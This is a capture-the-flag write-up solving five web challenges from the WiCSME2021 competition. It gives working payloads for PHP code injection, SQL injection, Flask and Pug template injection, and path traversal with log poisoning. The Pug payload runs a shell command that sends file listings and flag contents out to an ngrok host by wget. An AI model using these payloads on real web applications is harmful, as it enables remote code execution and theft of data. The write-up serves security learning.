# WiCSME2021 CTF

# web challenges:

## 1- SimPlay
![Screenshot at 2021-11-25 19-26-09](https://user-images.githubusercontent.com/52857059/143482771-46d1f5ad-c4c8-4667-882a-6d2c23525010.png)

After clicking the Try Again button :

![Screenshot at 2021-11-25 19-32-26](https://user-images.githubusercontent.com/52857059/143484789-d5764601-d715-4dda-87f6-225147275112.png)

I try php code injection ${system('ls')}

![Screenshot at 2021-11-25 19-35-36](https://user-images.githubusercontent.com/52857059/143484816-0131587c-3d6c-43f1-b947-5afac58b96ae.png)

It works But I can't find flag file.
let's try another payload with base64_decode function --> ${system(base64_decode(bHMgLi4v))}

![Screenshot at 2021-11-25 19-39-34](https://user-images.githubusercontent.com/52857059/143484886-c4cdb4ad-025d-46f2-85c7-57850b62bd3d.png)

I got flag name :")
next step , let's read flag file --> ${system(base64_decode(Y2F0IC4uL2ZsYWcq))}

![Screenshot at 2021-11-25 19-47-54](https://user-images.githubusercontent.com/52857059/143484917-bf996a6b-275b-4965-9982-0742345a348d.png)


## 2- Potent Quotes
![Screenshot at 2021-11-25 19-54-12](https://user-images.githubusercontent.com/52857059/143547317-5ee748d1-aab4-4f33-bc0e-8816ecadb6e9.png)

After downloading the files' challenge locally , I found query of input 

![Screenshot at 2021-11-26 09-53-45](https://user-images.githubusercontent.com/52857059/143547089-f06f8c4b-4749-4c33-9f31-9dc5a7249e64.png)

Let's try injecting pass input with ``` 1' or '1'='1 ```

![Screenshot at 2021-11-26 10-01-17](https://user-images.githubusercontent.com/52857059/143547148-b89b03d8-01be-44c9-97ef-8640261a8e0e.png)


## 3- INCEPTION(easy)
![Screenshot at 2021-11-26 10-04-55](https://user-images.githubusercontent.com/52857059/143547836-fcee23ee-9792-461d-90ca-799a392a5460.png)

After downloading the files' challenge locally ,I noticed The application use template Engine .
I used template injection in python because the application was made with flask.

![Screenshot at 2021-11-26 10-07-03](https://user-images.githubusercontent.com/52857059/143549346-bbbcb5dd-9b70-4215-9bec-90de69252b20.png)

I noticed also The flag in the config so the payload is ```{{config.items()}}```

![Screenshot at 2021-11-26 10-19-37](https://user-images.githubusercontent.com/52857059/143549374-639f8833-23a9-4695-9c45-2b810932b34d.png)

HTB{r3s3rv4t1on_t0_h311_1s_a11_s3t!}

## 4- IMF - Landing
![Screenshot at 2021-11-26 10-22-39](https://user-images.githubusercontent.com/52857059/143550824-7b43ab7e-56f6-47b9-aade-9470983c48de.png)

let's try path traversal 

![Screenshot at 2021-11-26 10-23-12](https://user-images.githubusercontent.com/52857059/143551120-363c8368-05e9-407f-8147-b3cab69b1f20.png)
It works.

I noticed the server is nginx so we could read the access.log ```/var/log/nginx/access.log```

![Screenshot at 2021-11-26 10-25-59](https://user-images.githubusercontent.com/52857059/143551202-38954555-d1cd-452b-818e-2db06bcc1bd4.png)

I notices the user-agent was printed in access.log

![Screenshot at 2021-11-26 10-38-17](https://user-images.githubusercontent.com/52857059/143551771-872a1ce2-bc54-40b3-bff4-9a29529861a5.png)

let's inject the user-agent with php code injection ```<?php system('ls') ?> ```

![Screenshot at 2021-11-26 10-28-55](https://user-images.githubusercontent.com/52857059/143551895-9deb0453-0197-4ae3-9255-de6f8cca9fdf.png)

![Screenshot at 2021-11-26 10-29-32](https://user-images.githubusercontent.com/52857059/143551935-8d010c3e-b79f-42bf-951b-a7a2ea93acda.png)

Let's try ```<?php system('ls ../') ?>```

![Screenshot at 2021-11-26 10-30-40](https://user-images.githubusercontent.com/52857059/143552105-99f4c676-95a2-4fd3-9c4e-c3210e4d8a64.png)

![Screenshot at 2021-11-26 10-30-54](https://user-images.githubusercontent.com/52857059/143552132-eaf7f512-6dec-4121-a88f-d662d597ddeb.png)

With ```<?php system('cat ../flag*') ?>``` we can read the flag

![Screenshot at 2021-11-26 10-31-40](https://user-images.githubusercontent.com/52857059/143552300-c8c42619-690a-4342-a5a0-46181cd2d3fb.png)

![Screenshot at 2021-11-26 10-31-54](https://user-images.githubusercontent.com/52857059/143552310-8137f420-2872-48f9-8254-cdfddc5e1322.png)

## 5- IMF-searching
![Screenshot at 2021-11-26 10-46-06](https://user-images.githubusercontent.com/52857059/143669832-4f692f5a-95c9-4b4b-b786-71a4123b6961.png)

After downloading the files' challenge locally ,I noticed The application use pug template Engine .
so I will search about pug ssti 
I will run in the background ```sudo python3 -m http.server 80``` to recieve response
running ```run ngrok http 80``` 
the payload is ```#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('wget http://ea4a-154-178-105-159.ngrok.io/?output=$('ls ../')')}()}```

The problem is if we do ls the first result of ls command will appear

![Screenshot at 2021-11-27 08-12-15](https://user-images.githubusercontent.com/52857059/143670460-2a3674e2-19c8-4db9-95d3-8afb4eb70cfd.png)

so let's replace ls ../ to ```ls ../flag*```
payload ```#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('wget http://ea4a-154-178-105-159.ngrok.io/?output=$('ls+../flag*')')}()}``` 

![Screenshot at 2021-11-27 08-25-10](https://user-images.githubusercontent.com/52857059/143670712-9eb3d484-133b-42af-a90d-298cc79c1d33.png)

the final payload is ```#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('wget http://ea4a-154-178-105-159.ngrok.io/?output=$('cat+../flag*')')}()}```

![Screenshot at 2021-11-27 08-24-41](https://user-images.githubusercontent.com/52857059/143670708-1e8d4c5c-12ef-4021-8e85-642396b9c009.png)









